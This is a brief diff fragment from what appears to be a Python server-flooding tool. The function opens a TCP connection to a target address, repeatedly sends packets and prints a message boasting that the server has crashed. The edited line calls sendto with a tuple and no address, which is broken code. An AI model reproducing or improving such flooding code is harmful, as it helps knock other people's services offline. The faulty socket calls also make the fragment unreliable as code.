@@ -385,7 +385,7 @@ def stack():
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ip,port))
-         s.sendto(data)
+         s.sendto((data,main_req))
          for y in range(pack):
           s.sendto(data)
           print("SÉRVÉR {1} CRÂSH BY ZÁN")
